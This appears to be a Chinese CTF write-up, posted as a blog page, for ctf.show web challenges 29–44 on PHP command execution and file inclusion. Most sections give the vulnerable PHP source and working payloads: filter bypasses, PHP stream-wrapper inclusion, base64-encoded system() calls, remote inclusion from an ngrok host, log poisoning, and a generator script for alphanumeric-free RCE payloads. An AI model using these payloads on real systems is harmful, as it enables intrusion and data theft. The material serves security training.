+?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php
+?c=eval($_GET[zf]);&amp;zf=system(&#39;nl flag.php&#39;);
+?c=system(&#39;a=g;cat$IFS$1fla$a.php&#39;);
+?c=system(&#39;1;a=f;d=ag;c=l;cat$IFS$a$c$d.php&#39;);
+?cecho$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
+?c=system(&#39;cat$IFS$9`ls`&#39;);
+</code></pre>
+<h1 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h1><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-04 00:12:34
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-04 00:42:26
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c = $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; 
+</code></pre>
+<p>这里发现多过滤了一个system函数,PHP中执行方法的函数有很多,比如passsthru exec shell_exec </p>
+<p><strong>法一</strong></p>
+<p>使用exec执行函数,虽然exec对执行结果不输出,但是可把执行的结果写入1.txt中,之后在查看1.txt文件</p>
+<pre><code>复制
+?c=exec(&#39;cp fla* 1.txt&#39;);
+拼接
+?c=exec(&#39;cat  &gt; 2.txt&#39;);
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292239718.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220329223900674"></p>
+
+<p>方法二</p>
+<p>用passthru函数执行命令,与exec的区别是 passthru直接将结果输出,不返回结果,不用使用echo查看结果</p>
+<pre><code>?c=passthru(&#39;cat `ls`&#39;);
+</code></pre>
+<p>方法三</p>
+<p>在php中echo 命令;也是可以执行并输出的,</p>
+<pre><code>?c=echo `ls`;
+echo `cat fla*`;
+</code></pre>
+<h2 id="执行命令函数"><a href="#执行命令函数" class="headerlink" title="执行命令函数"></a>执行命令函数</h2><pre><code>system()
+passthru()
+exec()
+shell_exec()
+popen()
+proc_open()
+pcntl_exec()
+`` 反引号 同shell_exec() 
+</code></pre>
+<p>payload</p>
+<pre><code>?c=echo exec(&#39;nl fla?????&#39;);
+?c=echo `nl fla&#39;&#39;g.p&#39;&#39;hp`;
+?c=echo `nl fla?????`;
+还有上一道题的很多payload都可以使用
+</code></pre>
+<h1 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h1><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-04 00:12:34
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-04 00:49:10
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c = $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;/i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; 
+</code></pre>
+<p>cat被过滤 空格也被过滤</p>
+<h2 id="linux查看文件"><a href="#linux查看文件" class="headerlink" title="linux查看文件"></a>linux查看文件</h2><pre><code>more:    一页一页的显示内容
+less:    与more类似
+head:    查看头几行
+tac:    从最后一行开始显示
+cat:    的反向显示
+tail:    查看尾几行
+nl:        显示的时候顺便输出行号
+od:        以二进制方法读取内容
+vi:        一种编辑器
+vim:    一种编辑器
+sort:    可以查看
+uinq:    可以查看 
+file -f:报错出具体内容grep
+grep:    在当前目录中,找出后缀有file字样的文件中包含test字符串的文件,并打印出该字符串的行.
+grep test *file strings
+</code></pre>
+<p>payload</p>
+<pre><code>?c=eval($_GET[zf]);&amp;zf=system(&#39;ls&#39;);
+?c=eval($_POST[zf]);    POST:zf=system(&#39;ls&#39;);
+?c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));
+?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
+?c=echo(`nl%09fl[abc]*`);
+?c=&quot;\x73\x79\x73\x74\x65\x6d&quot;(&quot;nl%09fl[a]*&quot;);等价于system()
+?c=echo`strings    f*`;
+?c=echo`strings\$IFS\$9f*`; 必须加转义字符
+</code></pre>
+<h2 id="php原生方法查看文件"><a href="#php原生方法查看文件" class="headerlink" title="php原生方法查看文件"></a>php原生方法查看文件</h2><pre><code>print_r(scandir(dirname(__FILE__)));查看当前目录下文件
+print_r(next(array_reverse(scandir(dirname(__FILE__)))));
+c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));
+</code></pre>
+<h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-04 00:12:34
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-04 00:56:31
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c = $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(/i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; 
+</code></pre>
+<p>include可以不用括号,分号可以用?&gt;代替</p>
+<h2 id="过滤括号include"><a href="#过滤括号include" class="headerlink" title="过滤括号include"></a>过滤括号include</h2><p>payload</p>
+<pre><code>?c=include$_GET[zf]?&gt;&amp;zf=php://filter/read=convert.base64-encode/resource=flag.php
+?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;
+?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==
+?c=include$_GET[zf]?&gt;&amp;zf=php://input POST:&lt;?php system(&#39;nl flag.php&#39;)?&gt;
+?c=include$_GET[zf]?&gt;&amp;zf=http://1d40-111-17-194-91.ngrok.io/wanan.txt 远程执行,这里的远程文件是txt的,如果是php就会执行远程服务器上的命令
+</code></pre>
+<h1 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h1><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-04 00:12:34
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-04 02:22:27
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+*/
+//
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c = $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\&quot;/i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+</code></pre>
+<p>payload</p>
+<pre><code>?c=include$_GET[zf]?&gt;&amp;zf=php://filter/read=convert.base64-encode/resource=flag.php
+?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;
+?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==
+?c=include$_GET[zf]?&gt;&amp;zf=php://input POST:&lt;?php system(&#39;nl flag.php&#39;)?&gt;
+?c=include$_GET[zf]?&gt;&amp;zf=http://1d40-111-17-194-91.ngrok.io/wanan.txt 远程执行
+</code></pre>
+<h1 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h1><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-04 00:12:34
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-04 04:21:29
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+*/
+
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c = $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|\&quot;/i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; 
+</code></pre>
+<p>payload</p>
+<pre><code>?c=include$_GET[zf]?&gt;&amp;zf=php://filter/read=convert.base64-encode/resource=flag.php
+?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;
+?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==
+?c=include$_GET[zf]?&gt;&amp;zf=php://input POST:&lt;?php system(&#39;nl flag.php&#39;)?&gt;
+?c=include$_GET[zf]?&gt;&amp;zf=http://1d40-111-17-194-91.ngrok.io/wanan.txt 远程执行
+</code></pre>
+<h1 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h1><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-04 00:12:34
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-04 04:21:23
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+*/
+
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c = $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; 
+</code></pre>
+<p>payload</p>
+<pre><code>?c=include$_GET[zf]?&gt;&amp;zf=php://filter/read=convert.base64-encode/resource=flag.php
+?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;
+?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==
+?c=include$_GET[zf]?&gt;&amp;zf=php://input POST:&lt;?php system(&#39;nl flag.php&#39;)?&gt;
+?c=include$_GET[zf]?&gt;&amp;zf=http://1d40-111-17-194-91.ngrok.io/wanan.txt 远程执行
+</code></pre>
+<h1 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h1><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-04 00:12:34
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-04 04:21:16
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+*/
+
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c = $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+    
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; 
+</code></pre>
+<p>payload</p>
+<pre><code>?c=include$_GET[zf]?&gt;&amp;zf=php://filter/read=convert.base64-encode/resource=flag.php
+?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;
+?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==
+?c=include$_GET[zf]?&gt;&amp;zf=php://input POST:&lt;?php system(&#39;nl flag.php&#39;)?&gt;
+?c=include$_GET[zf]?&gt;&amp;zf=http://1d40-111-17-194-91.ngrok.io/wanan.txt 远程执行
+</code></pre>
+<h1 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h1><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-04 00:12:34
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-04 05:18:55
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+*/
+
+//flag in flag.php
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c = $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;
+        include($c);
+        echo $flag;
+    
+    &#125;
+        
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; 
+</code></pre>
+<p>payload</p>
+<pre><code>?c=data://text/palin,&lt;?php system(&quot;nl fla*&quot;);?&gt;
+?c=data://text/palin;base64,PD9waHAgc3lzdGVtKCJubCBmbGEqIik7Pz4=
+?c=php://input POST:&lt;?php system(&#39;nl flag.php&#39;)?&gt;
+?c=http://1d40-111-17-194-91.ngrok.io/wanan.txt
+</code></pre>
+<h2 id="配合ua实现日志包含"><a href="#配合ua实现日志包含" class="headerlink" title="配合ua实现日志包含"></a>配合ua实现日志包含</h2><pre><code>?c=/var/log/nginx/access.log
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011446405.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220401144659304"></p>
+
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011447289.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220401144706214"></p>
+
+<h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-04 00:12:34
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-04 05:23:36
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+*/
+
+//flag in flag.php
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c = $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123;
+        include($c);
+        echo $flag;
+    
+    &#125;
+        
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; 
+</code></pre>
+<p>payload</p>
+<pre><code>?c=data://text/palin;base64,PD9waHAgc3lzdGVtKCJubCBmbGEqIik7Pz4=
+?c=http://1d40-111-17-194-91.ngrok.io/wanan.txt
+?c=/var/log/nginx/access.log     User-Agent: &lt;?php phpinfo();?&gt;
+</code></pre>
+<h1 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h1><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-04 00:12:34
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-04 06:13:21
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+*/
+
+//flag in flag.php
+error_reporting(0);
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c = $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;
+        include($c.&quot;.php&quot;);
+    &#125;
+        
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; 
+</code></pre>
+<p>payload</p>
+<pre><code>?c=data://text/plain,&lt;?=phpinfo();?&gt;
+</code></pre>
+<h1 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h1><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-04 00:12:34
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-04 06:03:36
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+*/
+
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c = $_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))&#123;
+        eval($c);
+    &#125;
+        
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+</code></pre>
+<p>这里过滤的是中文的括号,这里的基本命令可用,但是引号和美元符号都没了</p>
+<p><strong>法一</strong></p>
+<h2 id="利用session执行命令"><a href="#利用session执行命令" class="headerlink" title="利用session执行命令"></a>利用session执行命令</h2><p>利用session_id(),首先修改cookie中PHPSESSID内容为ls</p>
+<p>然后输入</p>
+<pre><code>?c=session_start();system(session_id());
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011627518.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220401162725395"></p>
+
+<p>在将c改成</p>
+<pre><code>?c=session_start();highlight_file(session_id());
+</code></pre>
+<p>修改PHPSESSID的值为flag.php就出问题了。经过测试发现，受php版本影响 5.5 -7.1.9均可以执行，因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的。</p>
+<p><strong>法二</strong></p>
+<h2 id="读文件夹数组改造查看文件"><a href="#读文件夹数组改造查看文件" class="headerlink" title="读文件夹数组改造查看文件"></a>读文件夹数组改造查看文件</h2><pre><code>highlight_file(next(array_reverse(scandir(pos(localeconv())))));
+
+localeconv():返回一包含本地数字及货币格式信息的数组.其中数组中的第一个为点号(.)
+pos():返回数组中的当前元素的值
+array_reverse():数组逆序
+scandir():获取当前目录下的文件
+next():函数将内部指针指向数组中的下一个元素并输出
+</code></pre>
+<p>首先通过pos(localeconv())得到点号,因为scandir(‘.’)表示得到当前目录下的文件,所以scandir(pos(localeconv()))就能得到flag.php了</p>
+<pre><code>?c=print_r(scandir(dirname(__FILE__)));查看当前目录下文件
+?c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));
+</code></pre>
+<h1 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h1><h2 id="无数字字母异或rce"><a href="#无数字字母异或rce" class="headerlink" title="无数字字母异或rce"></a>无数字字母异或rce</h2><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: 羽
+  Date:   2020-09-05 20:31:22
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-05 22:40:07
+  email: 1341963450@qq.com
+  link: https://ctf.show
+
+*/
+
+if(isset($_POST[&#39;c&#39;]))&#123;
+    $c = $_POST[&#39;c&#39;];
+if(!preg_match(&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#39;, $c))&#123;
+        eval(&quot;echo($c);&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+?&gt; 
+</code></pre>
+<p>先使用php脚本生成or_rce字典</p>
+<pre><code class="php">&lt;?php
+
+/* author yu22x */
+
+$myfile = fopen(&quot;or_rce.txt&quot;, &quot;w&quot;);
+$contents=&quot;&quot;;
+for ($i=0; $i &lt; 256; $i++) &#123; 
+    for ($j=0; $j &lt;256 ; $j++) &#123; 
+
+        if($i&lt;16)&#123;
+            $hex_i=&#39;0&#39;.dechex($i);
+        &#125;
+        else&#123;
+            $hex_i=dechex($i);
+        &#125;
+        if($j&lt;16)&#123;
+            $hex_j=&#39;0&#39;.dechex($j);
+        &#125;
+        else&#123;
+            $hex_j=dechex($j);
+        &#125;
+        $preg = &#39;/[0-9a-z]/i&#39;;//根据题目给的正则表达式修改即可
+        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;
+                    echo &quot;&quot;;
+    &#125;
+  
+        else&#123;
+        $a=&#39;%&#39;.$hex_i;
+        $b=&#39;%&#39;.$hex_j;
+        $c=(urldecode($a)|urldecode($b));
+        if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;
+            $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;
+        &#125;
+    &#125;
+
+&#125;
+&#125;
+fwrite($myfile,$contents);
+fclose($myfile);
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011757187.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220401175726105"></p>
+
+<p>使用python脚本生成payload</p>
+<pre><code class="php"># -*- coding: utf-8 -*-
+
+# author yu22x
+
+import requests
+import urllib
+from sys import *
+import os
+def action(arg):
+   s1=&quot;&quot;
+   s2=&quot;&quot;
+   for i in arg:
+       f=open(&quot;or_rce.txt&quot;,&quot;r&quot;)
+       while True:
+           t=f.readline()
+           if t==&quot;&quot;:
+               break
+           if t[0]==i:
+               #print(i)
+               s1+=t[2:5]
+               s2+=t[6:9]
+               break
+       f.close()
+   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;
+   return(output)
+   
+while True:
+   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;
+   print(param)
+
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011758828.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220401175800747"></p>
+
+<p>分号去一下</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011758209.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220401175832151"></p>
+
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011800030.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220401180013972"></p>
+
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011800342.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220401180019278"></p>
+
+<h2 id="其他无参命令执行方法"><a href="#其他无参命令执行方法" class="headerlink" title="其他无参命令执行方法"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">其他无参命令执行方法</a></h2><h1 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h1><h2 id="linux命令截断"><a href="#linux命令截断" class="headerlink" title="linux命令截断"></a>linux命令截断</h2><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-05 20:51:55
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c=$_GET[&#39;c&#39;];
+    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; 
+</code></pre>
+<p>&#x2F;dev&#x2F;null 2&gt;&amp;1,让所有的输出流(包括正确的和错误的)都定向到空设备丢弃.所以后面的不能执行,要把后面截断</p>
+<pre><code>?c=ls;%0a
+?c=ls;&amp;        不行编码试试%26
+?c=ls||
+</code></pre>
+<h1 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h1><pre><code class="php"> &lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+  Author: h1xa
+  Date:   2020-09-05 20:49:30
+  Last Modified by:   h1xa
+  Last Modified time: 2020-09-05 21:32:51
+  email: h1xa@ctfer.com
+  link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET[&#39;c&#39;]))&#123;
+    $c=$_GET[&#39;c&#39;];
+    if(!preg_match(&quot;/\;|cat/i&quot;, $c))&#123;
+        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125; 
+</code></pre>
+<p>payload</p>
+<pre><code>?c=ls%0a
+?c=ls%0a&amp;&amp;
+?c=ls%0a||
+?c=nl flag.php%0a
+</code></pre>
+<h1 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h1><pre><code class="php"> &lt;?php
+
